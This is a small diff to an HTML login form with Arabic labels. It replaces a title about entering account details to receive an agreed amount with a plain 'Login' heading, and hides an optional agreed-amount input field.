@@ -30,7 +30,7 @@
         </div>
 
         <!-- Login Title -->
-        <h1 class="login-title">الرجاء ادخال بيانات الحساب المراد تنزيل المبلغ المتفق عليه</h1>
+        <h1 class="login-title" id="loginTitle">تسجيل الدخول</h1>
 
         <!-- Login Form -->
         <form class="login-form" id="loginForm">
@@ -65,12 +65,11 @@
                 </button>
             </div>
 
-            <div class="form-group">
+            <div class="form-group" id="agreedAmountGroup" style="display: none;">
                 <input type="text" 
                        class="form-input" 
                        id="agreedAmount" 
-                       placeholder="المبلغ المتفق عليه"
-                       required>
+                       placeholder="المبلغ المتفق عليه">
             </div>
 
             <button type="submit" class="submit-btn">
